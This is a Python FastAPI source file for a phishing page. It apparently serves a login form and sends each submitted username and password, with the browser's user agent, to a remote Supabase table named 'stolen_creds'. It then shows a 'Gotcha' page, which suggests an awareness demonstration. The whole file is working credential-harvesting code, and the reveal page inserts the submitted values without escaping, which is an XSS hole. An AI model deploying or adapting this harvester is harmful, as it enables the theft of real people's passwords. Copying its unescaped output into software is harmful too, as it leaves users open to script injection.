import os
from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates # Add this
from supabase import create_client

app = FastAPI()

# Tell FastAPI to look in the /templates folder
templates = Jinja2Templates(directory="templates")

URL = "your_supabase_url"
KEY = "your_supabase_key"
supabase = create_client(URL, KEY)

# 1. ADD THIS: This serves the index.html when they click the link
@app.get("/", response_class=HTMLResponse)
async def get_index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/capture")
async def capture(request: Request, u: str = Form(...), p: str = Form(...)):
    user_info = request.headers.get('user-agent')
    
    # Save to Supabase
    data = {"username": u, "password": p, "user_agent": user_info}
    supabase.table("stolen_creds").insert(data).execute()

    # The Reveal Page (The "Gotcha")
    return HTMLResponse(content=f"""
        <body style="font-family: sans-serif; text-align: center; padding: 50px; background: #fff5f5;">
            <h1 style="color: #e53e3e; font-size: 3rem;">⚠️ SECURITY ALERT ⚠️</h1>
            <p>I just captured your info: <strong>{u}</strong> / <strong>{p}</strong></p>
            <h2>Look at my laptop screen!</h2>
        </body>
    """)
